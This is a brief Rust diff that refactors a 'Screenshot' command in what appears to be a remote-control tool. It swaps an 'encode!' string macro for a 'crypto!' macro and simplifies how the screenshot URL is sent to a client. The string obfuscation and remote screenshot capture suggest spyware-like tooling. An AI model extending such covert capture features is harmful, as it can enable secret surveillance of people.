@@ -5,12 +5,12 @@ pub struct Screenshot;
 
 #[async_trait]
 impl Command for Screenshot {
-    fn name(&self) -> &'static str {
-        encode!("screenshot")
+    fn name(&self) -> String {
+        crypto!("screenshot")
     }
 
-    fn help(&self) -> &'static str {
-        encode!("take a screenshot")
+    fn help(&self) -> String {
+        crypto!("take a screenshot")
     }
 
     fn min_args(&self) -> usize {
@@ -20,8 +20,6 @@ impl Command for Screenshot {
     async fn execute(&self, client: &mut Client, _args: Vec<&str>) -> anyhow::Result<()> {
         let url = utils::screenshot_url().await?;
 
-        client.send(url)?;
-
-        Ok(())
+        client.send(url)
     }
 }
